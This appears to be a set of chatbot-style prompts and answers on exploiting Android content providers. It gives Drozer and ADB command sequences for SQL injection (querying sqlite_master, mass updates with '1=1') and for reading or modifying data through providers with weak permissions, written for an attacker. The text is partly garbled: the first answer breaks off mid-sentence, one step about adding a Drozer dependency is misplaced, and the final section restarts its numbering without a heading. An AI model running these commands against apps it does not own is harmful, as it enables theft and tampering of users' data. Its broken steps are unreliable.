how to exploit content provider for sql injection

A content provider is a component in Android that allows apps to share data with other apps. An attacker can exploit a content provider by injecting malicious SQL statements into a query or insert statement, allowing them to modify or retrieve sensitive data.

Steps to exploit a content provider for SQL injection:

1. Identify a content provider in the target app that is vulnerable to SQL injection. You can use tools like Drozer or ADB to inspect the app's content providers and their URIs.

Craft a malicious SQL statement that will


how to exploit content provider for sql injection using drozer


1. Install Drozer on your computer and connect your Android device to it.

2. Run the command drozer console connect to establish a connection to the device.

3. Use the command run app.package.list -f <target_app_name> to find the package name of the target app.

4. Use the command run scanner.provider.finduris -a <target_app_package_name> to list the URIs of the target app's content providers.

5. Inspect the URIs of the target app's content providers and look for any that are vulnerable to SQL injection, this could be identified by the presence of user input in the queries without proper sanitization.

6. Create a new android project and add the Drozer agent as a dependency.

7. Use the command run app.provider.query <uri> --projection "* FROM sqlite_master" to inject a malicious SQL query into the content provider and retrieve sensitive data.

8. You can also use the command run app.provider.update <uri> --selection "1=1" --values "column='injected_value'" to inject a malicious SQL statement into the content provider and modify the data stored.




how to exploit content provider for sql injection using adb


Steps to exploit a content provider for SQL injection using ADB:

1. Connect the Android device to your computer and enable USB debugging.

2. Open a command prompt or terminal window and navigate to the platform-tools folder in the Android SDK directory.

3. Use the command adb shell content query --uri <content_provider_uri> --projection "* FROM sqlite_master" to inject a malicious SQL query into the content provider and retrieve sensitive data.

4. Use the command adb shell content update --uri <content_provider_uri> --where "1=1" --bind column:s:'injected_value' to inject a malicious SQL statement into the content provider and modify the data stored.


How to exploit content provider bypassing the access permission

A content provider is a component in Android that allows apps to share data with other apps. An attacker can exploit a content provider by bypassing the access permissions, allowing them to read, write, or modify sensitive data without proper authorization.

Steps to exploit a content provider for access permission issues using Drozer:

1. Install Drozer on your computer and connect your Android device to it.

2. Run the command drozer console connect to establish a connection to the device.

3. Use the command run app.package.list -f <target_app_name> to find the package name of the target app.

4. Use the command run scanner.provider.finduris -a <target_app_package_name> to list the URIs of the target app's content providers.

5. Inspect the URIs of the target app's content providers and look for any that have weak or no access permission, this could be identified by the presence of the attribute "readPermission" or "writePermission" with a weak or no value.

6. Create a new android project and add the Drozer agent as a dependency.

7. Use the command run app.provider.query <uri> --projection "*" to read data from the content provider without proper authorization.

8. Use the command run app.provider.update <uri> --selection "1=1" --values "column='injected_value'" to modify data stored in the content provider without proper authorization.

3. Use the command adb shell dumpsys package <target_app_package_name> to get the information about the target app's content providers and their permissions.

4. Inspect the output of the command for any content providers that have weak or no access permission, this could be identified by the presence of the attribute "readPermission" or "writePermission" with a weak or no value.

5. Use the command adb shell content query --uri <content_provider_uri> --projection "*" to read data from the content provider without proper authorization.

6. Use the command adb shell content update --uri <content_provider_uri> --where "1=1" --bind column:s:'injected_value' to modify data stored in the content provider without proper authorization.
